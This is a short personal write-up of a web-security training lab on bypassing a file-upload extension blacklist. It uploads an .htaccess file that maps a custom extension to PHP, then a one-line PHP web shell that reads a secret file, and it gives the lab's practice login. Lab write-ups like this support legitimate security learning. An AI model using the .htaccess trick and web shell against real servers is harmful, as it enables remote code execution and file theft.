# Lab: Web shell upload via extension blacklist bypass

>This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

>You can log in to your own account using the following credentials: wiener:peter

### Observation
There is a file upload area on the `my-account` page. I attempted to upload a file called `1readfile.php` and got the following error message: `Sorry, php files are not allowed Sorry, there was an error uploading your file.`

Interestingly, I can upload a file with the `.php5` extension, but it does not execute

### Next steps
I did some extra tinkering and couldn't figure it out. I looked at the hint and it says that we must uploaded 2 files. Immediately it clicked that I need to create a `.htaccess` file that would allow me to execute php.

I uploaded a file called `.htaccess` with the follow text:

`AddType application/x-httpd-php .nikoext`

This maps the `.nikoext` extension to php. So `file.nikoext` effectively becomes `file.php`. This `.htaccess` file applies to the following directories `/files/avatars/*`

### Solution
Now I upload a file called `1readfile.nikoext` which contains the following php code: 

`<?php echo file_get_contents('/home/carlos/secret');?>`


Now I can navigate to `GET /files/avatars/1readfile.nikoext`. Because of the previously uploaded `.htaccess` file, our file with the extension `.nikoext` gets executed as php and we can see the secret for user carlos

Lab solved!
